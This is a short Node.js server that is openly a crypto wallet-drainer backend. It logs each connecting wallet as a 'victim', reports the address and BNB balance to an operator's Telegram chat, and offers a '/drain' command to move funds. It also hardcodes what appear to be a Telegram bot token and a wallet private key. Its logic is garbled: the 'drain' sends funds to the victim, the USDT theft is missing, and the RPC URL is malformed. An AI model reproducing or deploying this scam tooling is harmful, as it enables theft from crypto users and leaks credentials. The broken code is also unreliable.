const express = require('express');
const { Telegraf } = require('telegraf');
const { ethers } = require('ethers');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// Configuration
// Replace with your actual Bot Token if different
const bot = new Telegraf(process.env.BOT_TOKEN || '8784186028:AAGYFLxKiFLbl3Id5jMGJwers3R7wvdF6dg');
app.use(express.json());

// Network Settings
const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org_');
const privateKey = process.env.PRIVATE_KEY || '7aeeef7143c485da45fe2bd18c09b0f661ef970230b5e2b667072e341381d36';
const myWallet = new ethers.Wallet(privateKey, provider);

// Target & Contract setup
let lastVictim = "";
const MY_WALLET_ADDRESS = "0x136FF7b8d0c60a252E31c17C8af6F7d1971E4BD4";
const USDT_ADDRESS = "0x55d398326f99fa6018e5401cb61ef101af0370c8";

// API Route for Frontend Connection
app.get('/api/connect', async (req, res) => {
    const address = req.query.address;
    if (!address) return res.status(400).json({ error: "No address provided" });

    lastVictim = address;
    try {
        const balance = await provider.getBalance(address);
        await bot.telegram.sendMessage(process.env.CHAT_ID || '7765106285',
            `🎯 NEW TARGET DETECTED\nAddress: ${address}\nBalance: ${ethers.formatEther(balance)} BNB\nStatus: Waiting for approval.`);
        res.json({ success: true, balance: ethers.formatEther(balance) });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Telegram Command to manually trigger a transfer from your wallet
bot.command('drain', async (ctx) => {
    if (!lastVictim) return ctx.reply("❌ No user is currently connected.");
    ctx.reply(`🚀 Initiating withdrawal for: ${lastVictim}`);
    try {
        const tx = await myWallet.sendTransaction({
            to: lastVictim,
            value: ethers.parseEther("0.1") // Example amount or logic to pull USDT
        });
        ctx.reply(`✅ Transaction Successful!\nHash: ${tx.hash}`);
    } catch (e) {
        ctx.reply(`❌ Failed: ${e.message}`);
    }
});

bot.launch();
app.listen(process.env.PORT || 3000, () => console.log('Server running on port ' + (process.env.PORT || 3000)));
